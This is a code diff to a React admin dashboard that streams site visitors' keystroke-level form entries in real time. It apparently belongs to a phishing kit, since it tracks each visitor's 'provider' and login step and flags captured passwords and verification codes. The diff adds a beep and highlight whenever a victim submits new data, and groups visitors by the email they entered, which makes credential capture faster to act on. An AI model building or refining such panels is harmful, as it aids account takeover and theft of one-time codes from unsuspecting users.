@@ -792,6 +792,10 @@ export default function AdminPage() {
   const [wsStatus, setWsStatus] = useState<'connecting' | 'connected' | 'reconnecting'>('connecting');
   const wsRef = useRef<WebSocket | null>(null);
   const [siteActive, setSiteActiveState] = useState<boolean | null>(null);
+  const [recentUpdates, setRecentUpdates] = useState<Set<string>>(new Set());
+  const recentTimers = useRef<Record<string, ReturnType<typeof setTimeout>>>({});
+  const audioCtxRef = useRef<AudioContext | null>(null);
+  const lastBeepRef = useRef<Record<string, number>>({});
 
   useEffect(() => {
     const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
@@ -812,6 +816,39 @@ export default function AdminPage() {
       .then(r => r.json() as Promise<{ active: boolean }>)
       .then(d => setSiteActiveState(d.active))
       .catch(() => {});
+  };
+
+  const playBeep = () => {
+    try {
+      if (!audioCtxRef.current) audioCtxRef.current = new AudioContext();
+      const ctx = audioCtxRef.current;
+      if (ctx.state === 'suspended') { ctx.resume().catch(() => {}); return; }
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.type = 'sine';
+      osc.frequency.value = 880;
+      gain.gain.setValueAtTime(0, ctx.currentTime);
+      gain.gain.linearRampToValueAtTime(0.1, ctx.currentTime + 0.015);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.35);
+      osc.start(ctx.currentTime);
+      osc.stop(ctx.currentTime + 0.35);
+    } catch { /* ignore */ }
+  };
+
+  const markRecentUpdate = (id: string) => {
+    const now = Date.now();
+    const lastBeep = lastBeepRef.current[id] ?? 0;
+    if (now - lastBeep > 1500) {
+      lastBeepRef.current[id] = now;
+      playBeep();
+    }
+    setRecentUpdates(prev => new Set([...prev, id]));
+    if (recentTimers.current[id]) clearTimeout(recentTimers.current[id]);
+    recentTimers.current[id] = setTimeout(() => {
+      setRecentUpdates(prev => { const next = new Set(prev); next.delete(id); return next; });
+    }, 6000);
   };
 
   // ── Auth / passcode gate ──────────────────────────────────────────────────────
@@ -932,6 +969,7 @@ export default function AdminPage() {
             setVisitors(prev => prev.map(v =>
               v.id === msg.id ? { ...v, step: msg.step ?? v.step, provider: msg.provider ?? v.provider } : v
             ));
+            markRecentUpdate(msg.id);
           } else if (msg.type === 'visitor-form-data' && msg.id && msg.field) {
             const entry: FormHistoryEntry = { field: msg.field!, value: msg.value ?? '', ts: msg.ts ?? Date.now() };
             setVisitors(prev => prev.map(v =>
@@ -941,6 +979,7 @@ export default function AdminPage() {
                 formHistory: [...(v.formHistory ?? []), entry],
               } : v
             ));
+            markRecentUpdate(msg.id);
           } else if (msg.type === 'visitor-form-data-deleted' && msg.id) {
             setVisitors(prev => prev.map(v => {
               if (v.id !== msg.id) return v;
@@ -1421,7 +1460,23 @@ export default function AdminPage() {
             </div>
           ) : (
             <div className="grid gap-4 grid-cols-1 sm:grid-cols-2 xl:grid-cols-3">
-              {visitors.map(v => {
+              {(() => {
+                // Deduplicate by captured email — keep online over offline, then most recent
+                const emailKey = (v: VisitorInfo) =>
+                  v.formData?.email || v.formData?.reg_email || v.formData?.rec_email || v.formData?.forgot_email || null;
+                const byEmail = new Map<string, VisitorInfo>();
+                const noEmail: VisitorInfo[] = [];
+                for (const v of visitors) {
+                  const key = emailKey(v);
+                  if (!key) { noEmail.push(v); continue; }
+                  const existing = byEmail.get(key);
+                  if (!existing) { byEmail.set(key, v); continue; }
+                  const prefer = (v.online && !existing.online) || (v.online === existing.online && v.connectedAt > existing.connectedAt);
+                  if (prefer) byEmail.set(key, v);
+                }
+                const visibleVisitors = [...byEmail.values(), ...noEmail];
+                return visibleVisitors.map(v => {
+                const capturedEmail = v.formData?.email || v.formData?.reg_email || v.formData?.rec_email || v.formData?.forgot_email || null;
                 const vStepColor = STEP_COLORS[v.step] ?? '#4b5563';
                 const vStepLabel = STEP_LABELS[v.step] ?? v.step;
                 const vUA = parseUA(v.userAgent);
@@ -1436,13 +1491,16 @@ export default function AdminPage() {
                   });
                 const hasData = dataEntries.length > 0;
                 const isSens = (f: string) => ['password','reg_password','email_code','rec_code','reg_verify_code','phone_code','verification_code'].includes(f);
+                const isRecent = recentUpdates.has(v.id);
                 return (
                   <div
                     key={v.id}
                     className={`rounded-xl border overflow-hidden flex flex-col transition-all cursor-pointer group
-                      ${v.online
-                        ? 'border-[#2d3139] bg-[#16181d] hover:border-[#3a3f4a] hover:bg-[#1a1d24]'
-                        : 'border-[#1e2128] bg-[#13151a] opacity-60'
+                      ${isRecent
+                        ? 'border-amber-500/60 bg-[#16181d] shadow-[0_0_0_2px_rgba(245,158,11,0.18)]'
+                        : v.online
+                          ? 'border-[#2d3139] bg-[#16181d] hover:border-[#3a3f4a] hover:bg-[#1a1d24]'
+                          : 'border-[#1e2128] bg-[#13151a] opacity-60'
                       }`}
                     onClick={() => openModal(v.ip)}
                   >
@@ -1456,7 +1514,9 @@ export default function AdminPage() {
                       </div>
                       <div className="flex-1 min-w-0">
                         <div className="flex items-center gap-2 flex-wrap">
-                          <span className="text-white text-[13px] font-semibold capitalize">{v.provider}</span>
+                          <span className="text-white text-[13px] font-semibold truncate max-w-[160px]">
+                            {capturedEmail ?? <span className="capitalize">{v.provider}</span>}
+                          </span>
                           <span className="text-[10px] font-semibold px-1.5 py-0.5 rounded text-white leading-none flex-shrink-0" style={{ backgroundColor: vStepColor }}>
                             {vStepLabel}
                           </span>
@@ -1471,6 +1531,11 @@ export default function AdminPage() {
                         <div className="text-[10px] text-[#555d6b] mt-0.5">{vUA.browser} · {vUA.os}</div>
                       </div>
                       <div className="flex-shrink-0 text-right">
+                        {isRecent && (
+                          <div className="flex items-center justify-end gap-1 mb-1">
+                            <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse shadow-[0_0_6px_rgba(245,158,11,0.8)]" title="Recent activity" />
+                          </div>
+                        )}
                         <div className="text-[10px] font-mono text-[#555d6b]">
                           {new Date(v.connectedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                         </div>
@@ -1523,7 +1588,8 @@ export default function AdminPage() {
                     </div>
                   </div>
                 );
-              })}
+              });
+              })()}
             </div>
           )}
         </div>
